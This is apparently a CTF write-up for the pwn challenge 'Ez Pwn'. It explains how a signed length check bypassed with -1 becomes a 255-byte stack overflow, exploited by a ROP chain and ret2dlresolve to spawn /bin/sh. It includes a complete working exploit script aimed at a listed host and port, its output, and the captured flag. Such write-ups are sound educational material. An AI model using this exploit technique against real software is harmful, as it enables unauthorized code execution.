---
title: Ez Pwn
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** Ez Pwn
- **Category:** Pwn
- **Flag:** `LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}`

---

## My initial read / first impressions

The challenge description was:

```text
definitely the oldest trick in the book
```

Connecting to the service gave a very familiar looking prompt:

```text
Let me know the length of your buffer:
```

So immediately this felt like some kind of bad length check. The challenge literally says "oldest trick," and the program asks for a buffer length before it asks for the actual input, which is usually not a good sign.

After sending `-1`, the program accepted it:

```text
okay, so your length is -1
>
```

That was the first real hint. A negative size should never make it anywhere near a `read()`, so if `-1` is accepted, there is probably a signedness or truncation bug somewhere.

## The bug

The core bug was exactly that: the program checked the length as a signed integer, but then used it later in a smaller unsigned-looking context.

The check was basically:

```c
if (len > 80) {
    exit(1);
}
```

That blocks something obvious like `200`, but it does not block `-1`, because `-1` is definitely not greater than `80`.

The problem is that the accepted length then gets stored in one byte before being used for the read size. So this happens:

```text
-1 -> 0xff -> 255 bytes
```

Instead of getting a small safe input, we get a 255 byte read into a stack buffer. That is enough to overwrite saved `rbp` and the saved return address.

So the "oldest trick" here is really:

```text
signed check passes
    -> value gets truncated to one byte
    -> negative length becomes huge enough
    -> stack overflow
```

## Binary situation

The binary was non-PIE, so the code addresses were fixed. The useful gadgets were also very conveniently sitting in the binary.

The weird but useful one was this gadget:

```text
0x401176: push rbp; mov rbp, rsp; pop rdi; ret
```

If we overwrite the saved `rbp` with `0`, then returning into this gadget gives us:

```text
rdi = 0
```

That is perfect for calling:

```c
read(0, writable_memory, length)
```

The stack offset to the saved `rbp` was:

```text
160 bytes
```

So the first stage payload starts with:

```text
'A' * 160
```

Then it overwrites saved `rbp`, controls the return address, and starts a ROP chain.

## Why ret2dlresolve

There was no easy win function this time, and I did not have a libc leak. Since the binary was dynamically linked and non-PIE, ret2dlresolve was a clean way to still call `system("/bin/sh")`.

The idea is:

```text
1. Overflow the stack with the 255-byte read.
2. ROP into read(0, .bss, stage2_len).
3. Send fake dynamic linker structures into .bss.
4. Return into PLT0 with a fake relocation index.
5. Trick the dynamic linker into resolving system.
6. Call system("/bin/sh").
7. Use the shell to cat the flag.
```

This avoids needing a libc leak, because the dynamic linker does the symbol resolution for us.

## Building the exploit

I used `.bss` as the writable area for the fake relocation, fake symbol, string table data, and `/bin/sh` string:

```python
BASE = 0x404800
```

The important dynamic linker table addresses were:

```python
SYMTAB = 0x4003c8
STRTAB = 0x4004d0
JMPREL = 0x400610
```

Then the fake structures were laid out so that the dynamic linker would treat them as a normal relocation for `system`.

The fake relocation uses type `R_X86_64_JUMP_SLOT`, which is `7`:

```python
r_info = (sym_index << 32) | 7
```

Then the fake symbol's name points at the string `system\x00`, and the argument points at `/bin/sh\x00`.

## Exploitation

This is the solve script I used:

```python
#!/usr/bin/env python3
import socket
import struct
import time
import re
import sys

HOST = "15.235.202.47"
PORT = 8999

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)
p16 = lambda x: struct.pack("<H", x)

# Binary constants from chall, non-PIE
OFFSET_RBP = 160

# gadget() gives us:
# 0x401176: push rbp; mov rbp, rsp; pop rdi; ret
# If saved rbp is 0, this becomes a compact "rdi = 0; ret"
SET_RDI_FROM_RBP = 0x401176

POP_RDI = 0x40117a
POP_RSI = 0x40117c
POP_RDX = 0x40117e

READ_PLT = 0x401050
PLT0 = 0x401020

# Dynamic linker table addresses
SYMTAB = 0x4003c8
STRTAB = 0x4004d0
JMPREL = 0x400610

# Writable page after .bss
BASE = 0x404800


def align_addr(addr, base, align):
    return addr + ((align - ((addr - base) % align)) % align)


def build_ret2dlresolve_payload():
    fake_rela = align_addr(BASE + 0x10, JMPREL, 24)
    fake_sym = align_addr(fake_rela + 24, SYMTAB, 24)
    fake_str = fake_sym + 24
    binsh = fake_str + len(b"system\x00")

    reloc_index = (fake_rela - JMPREL) // 24
    sym_index = (fake_sym - SYMTAB) // 24

    r_offset = BASE
    r_info = (sym_index << 32) | 7  # R_X86_64_JUMP_SLOT
    st_name = fake_str - STRTAB

    stage2 = b""
    stage2 += b"A" * (fake_rela - BASE)

    # Elf64_Rela
    stage2 += p64(r_offset)
    stage2 += p64(r_info)
    stage2 += p64(0)

    stage2 += b"B" * (fake_sym - (BASE + len(stage2)))

    # Elf64_Sym
    stage2 += p32(st_name)
    stage2 += bytes([0x12, 0x00])  # st_info, st_other
    stage2 += p16(0)               # st_shndx
    stage2 += p64(0)               # st_value
    stage2 += p64(0)               # st_size

    stage2 += b"system\x00"
    stage2 += b"/bin/sh\x00"

    return stage2, reloc_index, binsh


def build_stage1(stage2_len, reloc_index, binsh):
    chain = b""

    # Saved rbp = 0, then return to SET_RDI_FROM_RBP.
    # This sets rdi = 0 for read(0, BASE, len(stage2)).
    chain += p64(0)
    chain += p64(SET_RDI_FROM_RBP)

    chain += p64(POP_RSI)
    chain += p64(BASE)

    chain += p64(POP_RDX)
    chain += p64(stage2_len)

    chain += p64(READ_PLT)

    # After stage2 is read into BASE, resolve system and call system("/bin/sh")
    chain += p64(POP_RDI)
    chain += p64(binsh)

    chain += p64(PLT0)
    chain += p64(reloc_index)

    payload = b"A" * OFFSET_RBP + chain

    if len(payload) > 255:
        raise ValueError(f"Stage1 too large: {len(payload)} bytes")

    return payload


def recv_some(sock, timeout=0.4):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data


def main():
    stage2, reloc_index, binsh = build_ret2dlresolve_payload()
    stage1 = build_stage1(len(stage2), reloc_index, binsh)

    print(f"[+] stage1 length = {len(stage1)}")
    print(f"[+] stage2 length = {len(stage2)}")
    print(f"[+] reloc_index = {reloc_index}")
    print(f"[+] /bin/sh address = {hex(binsh)}")

    s = socket.create_connection((HOST, PORT))

    print(recv_some(s).decode(errors="ignore"), end="")

    # -1 passes signed check, then becomes 0xff as unsigned char
    s.sendall(b"-1\n")
    time.sleep(0.1)
    print(recv_some(s).decode(errors="ignore"), end="")

    print("[+] Sending overflow payload")
    s.sendall(stage1)

    # Let the vulnerable read return and the ROP read() start waiting
    time.sleep(0.2)
    out = recv_some(s)
    print(out.decode(errors="ignore"), end="")

    print("[+] Sending fake dynamic linker structures")
    s.sendall(stage2)

    time.sleep(0.2)

    # We should now have a shell.
    cmd = b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit\n"
    s.sendall(cmd)

    time.sleep(0.5)
    result = recv_some(s, timeout=1.5)

    text = result.decode(errors="ignore")
    print(text, end="")

    m = re.search(r"LYKNCTF\{[^}]+\}", text)
    if m:
        print(f"\n[+] FLAG: {m.group(0)}")
    else:
        print("\n[-] No flag pattern found in output.")


if __name__ == "__main__":
    main()
```

Running it gave:

```text
[+] stage1 length = 248
[+] stage2 length = 95
[+] reloc_index = 704
[+] /bin/sh address = 0x404857
Let me know the length of your buffer:
okay, so your length is -1
>
[+] Sending overflow payload
Let's me check if you are safe or not!
Here a fake flag for your effort: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Sending fake dynamic linker structures
LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}
[+] FLAG: LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}
```

## Why this works

The program tries to be safe by asking for a length and rejecting values above `80`, but it forgets that negative integers exist.

So `-1` passes the signed check, then becomes `255` once it is squeezed into a single byte. That gives enough input space to smash the stack.

The first ROP chain has to stay under that 255-byte limit, so it only does one job: call `read()` again and place the ret2dlresolve data into `.bss`.

After that, the fake relocation makes the dynamic linker resolve `system`, and the final call becomes:

```c
system("/bin/sh");
```

Then I just used the shell to print the flag.

The full flow is:

```text
send -1
    -> signed length check passes
    -> length becomes 0xff
    -> overflow stack buffer
    -> ROP read(stage2 into .bss)
    -> ret2dlresolve resolves system
    -> system("/bin/sh")
    -> cat flag
```

So this was a signedness/truncation bug turned into a stack overflow, then ret2dlresolve to avoid needing a libc leak. Definitely old-school, but still a really fun chain.

## Flag

```text
LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}
```
